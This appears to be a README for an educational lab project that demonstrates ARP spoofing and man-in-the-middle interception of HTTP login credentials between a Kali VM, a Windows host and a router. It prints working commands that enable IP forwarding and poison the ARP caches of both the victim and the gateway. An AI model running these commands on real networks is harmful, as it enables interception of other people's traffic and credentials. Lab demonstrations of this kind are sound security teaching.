# 🔐 ARP Spoofing & MITM Traffic Interception (Cyber Security Project)

This project demonstrates how an attacker inside a local network can perform an **ARP Spoofing attack** to position themselves as a **Man-in-the-Middle (MITM)** and intercept unencrypted HTTP traffic. The goal is to understand LAN-based attack vectors and highlight the importance of encryption and network-level defenses.

---

## 📌 Project Overview

- **Attacker:** Kali Linux VM (`192.168.0.105`)
- **Victim:** Windows Host OS (`192.168.0.101`)
- **Gateway/Router:** `192.168.0.1`
- **Interface Used:** `eth0`
- **Tools:** `arpspoof`, `Wireshark`

The attacker successfully intercepted HTTP credentials submitted by the victim through a test login page, proving the effectiveness of MITM attacks on unsecured networks.

---

## 🧩 Commands Used

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

sudo arpspoof -i eth0 -t 192.168.0.101 192.168.0.1
sudo arpspoof -i eth0 -t 192.168.0.1 192.168.0.101
